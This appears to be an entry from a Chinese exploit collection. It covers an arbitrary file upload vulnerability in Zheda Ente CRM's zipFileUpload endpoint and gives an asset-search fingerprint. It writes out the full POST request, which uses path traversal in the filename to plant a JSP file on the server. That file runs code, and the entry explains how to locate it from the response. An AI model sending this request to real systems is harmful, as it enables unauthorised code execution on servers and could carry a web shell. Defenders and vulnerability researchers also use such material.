# 浙大恩特CRMzipFileUpload任意文件上传漏洞

- **系统**：浙大恩特CRMzipFileUpload　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="浙大恩特 CRM"`
- **请求**：`POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 260`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../../stc.jsp"
Content-Type: application/zip
<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--00content0boundary00--

根据回显拼接上传文件位置
/enterdoc/dao/2024011111284104541134657/stc.jsp

\[zhedaente-entsoft-fileupload-CrmBasicAction.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 浙大恩特CRM zipFileUpload任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙大恩特CRM